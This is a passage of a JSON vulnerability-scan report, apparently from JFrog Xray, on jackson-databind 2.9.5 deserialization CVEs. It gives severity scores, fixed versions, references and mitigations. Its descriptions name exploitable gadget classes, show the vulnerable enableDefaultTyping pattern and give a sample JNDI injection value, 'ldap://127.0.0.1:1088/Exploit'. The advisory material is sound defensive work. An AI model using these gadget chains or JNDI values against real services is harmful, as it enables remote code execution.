          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the `net.sf.ehcache.hibernate.EhcacheJtaTransactionManagerLookup ` gadget in [netf.sf.ehcache]( https://github.com/svn2github/ehcache/tree/ ) , one of the extended classes supports JNDI naming and allows calling `lookup` with an arbitrary location by  calling `JndiSelector` with an arbitrary argument like `\"ldap://127.0.0.1:1088/Exploit\"` that enables attacker to perform remote code execution when executing `lookupTransactionManager`. This is demonstrated in this [PoC](https://www.programmersought.com/article/80917857170/) of an older issue by using marshalsec (see section \"Build an environment\"). \n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes ` net.sf.ehcache ` in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes ` net.sf.ehcache ` in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `net.sf.ehcache` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2018-14718",
            "cvss_v2_score": "7.5",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "9.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.7 might allow remote attackers to execute arbitrary code by leveraging failure to block the slf4j-ext class from polymorphic deserialization.",
        "severity": "Critical",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.7.9.5]",
              "[2.8.11.3]",
              "[2.9.7]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-74876",
        "references": [
          "https://nvd.nist.gov/vuln/detail/CVE-2018-14718",
          "https://access.redhat.com/errata/RHSA-2019:1823",
          "https://github.com/FasterXML/jackson-databind/issues/2097",
          "https://www.debian.org/security/2019/dsa-4452",
          "https://lists.apache.org/thread.html/6a78f88716c3c57aa74ec05764a37ab3874769a347805903b393b286%40%3Cdev.lucene.apache.org%3E",
          "https://lists.apache.org/thread.html/6a78f88716c3c57aa74ec05764a37ab3874769a347805903b393b286@%3Cdev.lucene.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:3892",
          "https://lists.apache.org/thread.html/82b01bfb6787097427ce97cec6a7127e93718bc05d1efd5eaffc228f%40%3Cdev.lucene.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:0877",
          "https://access.redhat.com/errata/RHSA-2019:3002",
          "https://lists.apache.org/thread.html/r1d4a247329a8478073163567bbc8c8cb6b49c6bfc2bf58153a857af1@%3Ccommits.druid.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/commit/87d29af25e82a249ea15858e2d4ecbf64091db44",
          "https://access.redhat.com/errata/RHSA-2019:1782",
          "https://access.redhat.com/errata/RHBA-2019:0959",
          "https://lists.apache.org/thread.html/r1d4a247329a8478073163567bbc8c8cb6b49c6bfc2bf58153a857af1%40%3Ccommits.druid.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:1822",
          "https://access.redhat.com/errata/RHSA-2019:4037",
          "https://access.redhat.com/errata/RHSA-2019:3149",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442%40%3Cdev.drill.apache.org%3E",
          "https://www.oracle.com/technetwork/security-advisory/cpujan2019-5072801.html",
          "https://github.com/FasterXML/jackson/wiki/Jackson-Release-2.9.7",
          "https://www.oracle.com/security-alerts/cpuapr2020.html",
          "https://security.netapp.com/advisory/ntap-20190530-0003/",
          "https://lists.apache.org/thread.html/ba973114605d936be276ee6ce09dfbdbf78aa56f6cdc6e79bfa7b8df%40%3Cdev.lucene.apache.org%3E",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f@%3Cdev.drill.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:0782",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc@%3Cissues.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc%40%3Cissues.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442@%3Cdev.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f%40%3Cdev.drill.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:2858",
          "https://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html",
          "https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html",
          "https://access.redhat.com/errata/RHSA-2019:1797",
          "https://access.redhat.com/errata/RHSA-2019:3140",
          "https://lists.debian.org/debian-lts-announce/2019/03/msg00005.html",
          "https://www.oracle.com/security-alerts/cpuoct2020.html",
          "https://lists.apache.org/thread.html/ba973114605d936be276ee6ce09dfbdbf78aa56f6cdc6e79bfa7b8df@%3Cdev.lucene.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:2804",
          "http://www.securityfocus.com/bid/106601",
          "https://seclists.org/bugtraq/2019/May/68",
          "https://lists.apache.org/thread.html/82b01bfb6787097427ce97cec6a7127e93718bc05d1efd5eaffc228f@%3Cdev.lucene.apache.org%3E",
          "https://github.com/advisories/GHSA-645p-88qh-w398",
          "https://www.oracle.com/security-alerts/cpujan2020.html"
        ],
        "extended_information": {
          "short_description": "A typing issue in multiple classes in Jackson-databind allows a remote attacker to perform remote code execution.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, the following classes were found to be able to cause remote code execution when used as Java gadgets -\n```\norg.slf4j.ext.EventData\n```\n\n\nExploitation requires:\n\n-\tDefault typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes one of the above classes in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\tDefault typing enabled for external JSON endpoints\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.\n-\tThe vulnerable Java service includes one of the following classes in its Java classpath\n```\norg.slf4j.ext.EventData\nl```",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            }
          ],
          "remediation": "##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-35728",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "8.1",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.10.8 mishandles the interaction between serialization gadgets and typing, related to com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool (aka embedded Xalan in org.glassfish.web/javax.servlet.jsp.jstl).",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.10.8]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-137428",
        "references": [
          "https://www.oracle.com//security-alerts/cpujul2021.html",
          "https://www.oracle.com/security-alerts/cpuapr2022.html",
          "https://github.com/FasterXML/jackson-databind/issues/2999",
          "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://medium.com/%40cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://github.com/FasterXML/jackson-databind/commit/1ca0388c2fb37ac6a06f1c188ae89c41e3e15e84",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-35728",
          "https://www.oracle.com/security-alerts/cpuApr2021.html",
          "https://github.com/advisories/GHSA-5r5r-6hpj-8gg9",
          "https://lists.debian.org/debian-lts-announce/2021/04/msg00025.html",
          "https://www.oracle.com/security-alerts/cpujul2022.html",
          "https://www.oracle.com/security-alerts/cpuoct2021.html",
          "https://www.oracle.com/security-alerts/cpujan2022.html",
          "https://security.netapp.com/advisory/ntap-20210129-0007/"
        ],
        "extended_information": {
          "short_description": "A typing issue in Apache Xalan (oracle.wls) in Jackson-databind allows a remote attacker to perform remote code execution.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted]( https://github.com/FasterXML/jackson-databind/blob/2.13/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the [Apache Xalan]( https://github.com/apache/xalan-j) (aka embedded Xalan) gadget, a JNDI controller called `JNDIConnectionPool ` can be used by an attacker to initiate connection with a malicious server and achieve remote code execution by loading arbitrary Java classes . For that the attacker will invoke the ` setJndiPath` method to set the `jndiPath` to something like `\"ldap://127.0.0.1:1088/Exploit\"` as detailed in this [PoC](https://github.com/Al1ex/CVE-2020-35728).\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes oracle.wls in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes oracle.wls in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            }
          ],
          "remediation": "##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)\n\n##### Deployment mitigations\n\nRemove `oracle.wls` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-11620",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "8.1",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to org.apache.commons.jelly.impl.Embedded (aka commons-jelly).",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.6.7.4]",
              "[2.9.10.4]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-96133",
        "references": [
          "https://www.oracle.com/security-alerts/cpuoct2020.html",
          "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2@%3Cissues.geode.apache.org%3E",
          "https://lists.debian.org/debian-lts-announce/2020/04/msg00012.html",
          "https://github.com/FasterXML/jackson-databind/commit/08fbfacf89a4a4c026a6227a1b470ab7a13e2e88",
          "https://github.com/FasterXML/jackson-databind/issues/2682",
          "https://github.com/FasterXML/jackson-databind/commit/77040d85e3eb6710508e6445640ae1a3d5e60c22",
          "https://medium.com/%40cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://github.com/advisories/GHSA-h4rc-386g-6m85",
          "https://www.oracle.com/security-alerts/cpujul2020.html",
          "https://www.oracle.com/security-alerts/cpujan2021.html",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2%40%3Cissues.geode.apache.org%3E",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-11620",
          "https://security.netapp.com/advisory/ntap-20200511-0004/",
          "https://security.netapp.com/advisory/ntap-20200511-0004"
        ],
        "extended_information": {
          "short_description": "A typing issue in commons-jelly in Jackson-databind allows a remote attacker to perform code injection.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted]( https://github.com/FasterXML/jackson-databind/blob/2.13/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the [commons-jelly](https://github.com/apache/commons-jelly) gadget, an attacker can setup a Jelly script and then execute it by invoking `setScript` and `execute`, which leads to remote code execution.\n\nWhen this library is included, an attacker can build a working exploit, and even automate this process by using [ysoserial]( https://github.com/frohoff/ysoserial), a tool that finds gadgets and create payloads for vulnerable java deserializers.\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes commons-jelly in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            },
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes commons-jelly in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            }
          ],
          "remediation": "##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)\n\n##### Deployment mitigations\n\nRemove `commons-jelly` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-8840",
            "cvss_v2_score": "7.5",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "9.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.0.0 through 2.9.10.2 lacks certain xbean-reflect/JNDI blocking, as demonstrated by org.apache.xbean.propertyeditor.JndiConverter.",
        "severity": "Critical",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.6.7.4]",
              "[2.7.9.7]",
              "[2.8.11.5]",
              "[2.9.10.3]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-94620",
        "references": [
          "https://lists.apache.org/thread.html/re8ae2670ec456ef1c5a2a661a2838ab2cd00e9efa1e88c069f546f21@%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rdea588d4a0ebf9cb7ce8c3a8f18d0d306507c4f8ba178dd3d20207b8@%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/rcc72b497e3dff2dc62ec9b89ceb90bc4e1b14fc56c3c252a6fcbb013%40%3Cdev.ranger.apache.org%3E",
          "https://lists.apache.org/thread.html/r9e59ebaf76fd00b2fa3ff5ebf18fe075ca9f4376216612c696f76718%40%3Cdev.ranger.apache.org%3E",
          "https://lists.apache.org/thread.html/rb99c7321eba5d4c907beec46675d52827528b738cfafd48eb4d862f1@%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/re7326b8655eab931f2a9ce074fd9a1a51b5db11456bee9b48e1e170c@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r8e96c340004b7898cad3204ea51280ef6e4b553a684e1452bf1b18b1%40%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/rdf8d389271a291dde3b2f99c36918d6cb1e796958af626cc140fee23@%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r078e68a926ea6be12e8404e47f45aabf04bb4668e8265c0de41db6db%40%3Ccommits.druid.apache.org%3E",
          "https://lists.apache.org/thread.html/rc068e824654c4b8bd4f2490bec869e29edbfcd5dfe02d47cbf7433b2%40%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/r65ee95fa09c831843bac81eaa582fdddc2b6119912a72d1c83a9b882@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rdf311f13e6356297e0ffe74397fdd25a3687b0a16e687c3ff5b834d8%40%3Cdev.ranger.apache.org%3E",
          "https://lists.apache.org/thread.html/r9ecf211c22760b00967ebe158c6ed7dba9142078e2a630ab8904a5b7%40%3Cdev.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r3d20a2660b36551fd8257d479941782af4a7169582449fac1704bde2@%3Ccommits.druid.apache.org%3E",
          "https://lists.apache.org/thread.html/r428d068b2a4923f1a5a4f5fc6381b95205cfe7620169d16db78e9c71@%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r446646c5588b10f5e02409ad580b12f314869009cdfbf844ca395cec@%3Cdev.ranger.apache.org%3E",
          "https://lists.apache.org/thread.html/r446646c5588b10f5e02409ad580b12f314869009cdfbf844ca395cec%40%3Cdev.ranger.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpuoct2020.html",
          "https://lists.apache.org/thread.html/r5d8bea8e9d17b6efcf4a0e4e194e91ef46a99f505777a31a60da2b38@%3Cdev.ranger.apache.org%3E",
          "https://lists.apache.org/thread.html/r9ecf211c22760b00967ebe158c6ed7dba9142078e2a630ab8904a5b7@%3Cdev.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/ra275f29615f35d5b40106d1582a41e5388b2a5131564e9e01a572987%40%3Cdev.ranger.apache.org%3E",
          "https://lists.apache.org/thread.html/r2fa8046bd47fb407ca09b5107a80fa6147ba4ebe879caae5c98b7657@%3Cdev.ranger.apache.org%3E",
          "https://lists.apache.org/thread.html/r319f19c74e06c201b9d4e8b282a4e4b2da6dcda022fb46f007dd00d3@%3Ccommits.druid.apache.org%3E",
          "https://lists.apache.org/thread.html/rfc1ccfe89332155b72ce17f13a2701d3e7b9ec213324ceb90e79a28a%40%3Cdev.ranger.apache.org%3E",
          "https://lists.apache.org/thread.html/r65ee95fa09c831843bac81eaa582fdddc2b6119912a72d1c83a9b882%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r428d068b2a4923f1a5a4f5fc6381b95205cfe7620169d16db78e9c71%40%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r6fdd4c61a09a0c89f581b4ddb3dc6f154ab0c705fcfd0a7358b2e4e5%40%3Cissues.zookeeper.apache.org%3E",
